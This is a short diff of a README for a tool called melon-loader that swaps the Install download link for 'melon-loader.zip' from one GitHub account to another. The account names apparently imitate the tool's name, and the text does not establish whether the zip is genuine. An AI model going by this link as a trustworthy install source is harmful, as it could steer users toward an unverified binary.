@@ -5,7 +5,7 @@
 <img width="375" height="308" alt="2c8888ab-9ab2-4df1-b6a8-e5260b0e48c1" src="https://github.com/user-attachments/assets/6a5e7420-5774-473d-82a7-a6a90b5426f7" />
 
 ## Install
-[Download `melon-loader.zip`](https://github.com/melon-loaders/melon-loader-download/releases/download/v0.7.4/melon-loader.zip)
+[Download `melon-loader.zip`](https://github.com/melonloader-IL2CPP/melon-loader-download/releases/download/v0.7.4/melon-loader.zip)
 ---
 
 <img width="481" height="441" alt="b1ef114a-af71-4e58-b37c-1ab98d5fbb6b" src="https://github.com/user-attachments/assets/a7c56ed0-0a66-4ae5-8c58-9a82a09d1132" />
